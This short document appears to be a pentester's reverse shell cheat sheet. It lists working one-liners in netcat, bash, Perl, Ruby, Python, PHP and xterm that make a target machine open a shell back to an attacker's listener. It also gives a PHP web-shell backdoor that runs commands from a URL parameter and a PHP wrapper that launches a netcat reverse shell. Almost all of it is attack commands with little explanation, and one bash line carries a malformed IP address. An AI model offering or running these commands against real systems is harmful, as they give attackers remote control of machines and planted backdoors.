REVERSE_SHELL
Reverse Shell


Netcat:
===================================================================
On the listener:

` nc -l -p 8080 -vvv`

On the remote host...


nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.103 4444 >/tmp/f &


Bash:

===================================================================
bash -i >& /dev/tcp/192.168.2831/4444 0>&1

exec 5<>/dev/tcp/evil.com/8080
cat <&5 | while read line; do $line 2>&5 >&5; done

Perl:

====================================================================
perl -e 'use Socket;$i="192.168.28.31";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


Ruby:

=====================================================================
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

Python:

======================================================================
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.28.31",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP

=======================================================================
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. It it doesn't work, try 4,5, or 6)

PHP backdoor :

<?php passthru($_GET['cmd']); ?>
XTERM:

Server:
xterm -display 10.0.0.1:1
Listener:
Xnest :1
xhost +targetip

=======================================================================

<?php echo shell_exec ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacking IP port >/tmp/f');?>



